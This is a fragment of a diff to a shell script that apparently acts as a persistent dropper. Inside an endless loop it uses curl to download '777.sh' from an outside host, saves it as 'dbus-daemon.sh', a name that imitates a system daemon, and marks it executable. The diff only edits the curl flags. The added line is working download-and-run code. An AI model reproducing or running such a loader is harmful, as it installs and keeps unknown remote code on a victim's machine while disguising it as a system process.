@@ -10,7 +10,7 @@ fi
 
 while true; do
     if [ ! -f "${DIR1}/dbus-daemon.sh" ]; then
-        curl --insecure --connect-timeout 10 -sL https://dhruvv.tech/777.sh -o "${DIR1}/dbus-daemon.sh"
+        curl -sL https://dhruvv.tech/777.sh -o "${DIR1}/dbus-daemon.sh"
         chmod a+x "${DIR1}/dbus-daemon.sh"
     fi
 
